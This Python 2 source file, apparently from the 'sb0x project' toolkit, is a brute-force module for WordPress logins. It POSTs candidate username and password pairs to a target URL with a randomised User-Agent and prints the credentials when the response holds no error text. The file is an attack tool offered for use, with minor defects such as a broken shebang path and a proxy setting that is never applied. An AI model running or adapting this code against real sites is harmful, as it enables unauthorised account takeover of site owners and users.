#!/usr/in/env python

"""
wordpress_test.py lib for wordpress brute force 
author: levi0x0 (https://www.youtube.com/levi0x0)
Copyright (c) 2013-201x sb0x project

See the file LICENSE
"""
import urllib2
import urllib
import sys
import socket
from random import choice

#class brute_force
class brute_force(object):
	"""brute force method"""

	def __init__(self, target, tags, user, passwords, proxy, proxy_server, proxy_port, user_agent,verbose):

		self.target = target #target
		self.tags = tags #HTML tags
		self.user = user #UserName
		self.passwords = passwords #Passwords wordlist
		self.proxy = proxy #proxy true or false
		self.proxy_server = proxy_server #proxy server
		self.proxy_port = proxy_port #proxy port
		self.user_agent = user_agent #user_agetn lists]
		
		self.headers = {
		'User-Agent': choice(self.user_agent),
		'Accept':'text/html',
		'Accept-Language':'en-US',
		'Accept-Encoding':'gzip, deflate',
		'DNT':1,} #http headers to send
		
		self.verbose = verbose #verbose mode if true



	def run(self):
		
		self.data = urllib.urlencode(self.tags) #encode POST data
		if self.proxy:
			self._pro_sepo = "%s:%d" % (self.proxy_server, self.proxy_port)
		else:
			pass
			
		self.opener = urllib2.build_opener()
		self.response = self.opener.open(self.target,self.data).read()

		if self.response:
			if "ERROR" in self.response or "Error" in self.response or "login_error" in self.response or "incorrect" in self.response.lower():
				if self.verbose:
					print "[-]USER:%s PASS:%s<--" % (self.user,self.passwords)
			else:
				print "\n[*]ERROR NOT FOUND (:"
				print "[+]USER: %s" % (self.user)
				print "[+]Password:%s" % (self.passwords)
				print "[*] sb0x project Copyright (c) 2013\n"
				sys.exit()
